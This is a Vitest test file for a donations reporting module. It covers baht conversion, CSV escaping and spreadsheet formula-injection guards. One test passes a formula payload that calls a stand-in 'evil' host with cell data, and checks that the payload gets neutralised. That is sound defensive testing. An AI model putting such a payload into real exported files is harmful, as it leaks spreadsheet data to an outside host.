import { describe, expect, it } from "vitest";
import { csvSafeText, isReportType, parseReportQuery, satangToBahtPlain, toCsv } from "./report";

describe("satangToBahtPlain", () => {
  it("renders plain baht decimals (no grouping) and stays BigInt-precise", () => {
    expect(satangToBahtPlain("100050")).toBe("1000.50");
    expect(satangToBahtPlain(0)).toBe("0.00");
    expect(satangToBahtPlain("5")).toBe("0.05");
    expect(satangToBahtPlain("-7000")).toBe("-70.00");
    // > 2^53 satang must not lose precision
    expect(satangToBahtPlain("900719925474099300")).toBe("9007199254740993.00");
  });
});

describe("toCsv", () => {
  it("escapes commas, quotes, and newlines per RFC 4180 with CRLF rows", () => {
    const csv = toCsv(
      ["a", "b"],
      [
        ["x,y", 'he said "hi"'],
        ["line1\nline2", "ok"],
      ],
    );
    expect(csv).toBe('a,b\r\n"x,y","he said ""hi"""\r\n"line1\nline2",ok');
  });
});

describe("csvSafeText", () => {
  it("prefixes a single quote on cells that would execute as a spreadsheet formula", () => {
    expect(csvSafeText("=1+1")).toBe("'=1+1");
    expect(csvSafeText("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvSafeText("+1")).toBe("'+1");
    expect(csvSafeText("-1")).toBe("'-1");
    expect(csvSafeText('=HYPERLINK("http://evil/?"&A1)')).toBe("'=HYPERLINK(\"http://evil/?\"&A1)");
  });

  it("leaves ordinary text (incl. Thai names) untouched", () => {
    expect(csvSafeText("คุณสมชาย")).toBe("คุณสมชาย");
    expect(csvSafeText("Wat Arun")).toBe("Wat Arun");
    expect(csvSafeText("")).toBe("");
    expect(csvSafeText("123.45")).toBe("123.45");
  });
});

describe("parseReportQuery", () => {
  it("keeps valid dates, drops calendar-invalid ones, defaults take", () => {
    const q = parseReportQuery({ dateFrom: "2026-05-01", dateTo: "2026-13-99", status: "confirmed" });
    expect(q.dateFrom).toBe("2026-05-01");
    expect(q.dateTo).toBeUndefined();
    expect(q.status).toBe("confirmed");
    expect(q.take).toBe(500);
  });

  it("guards report types", () => {
    expect(isReportType("donations")).toBe(true);
    expect(isReportType("ledger")).toBe(true);
    expect(isReportType("nope")).toBe(false);
  });
});
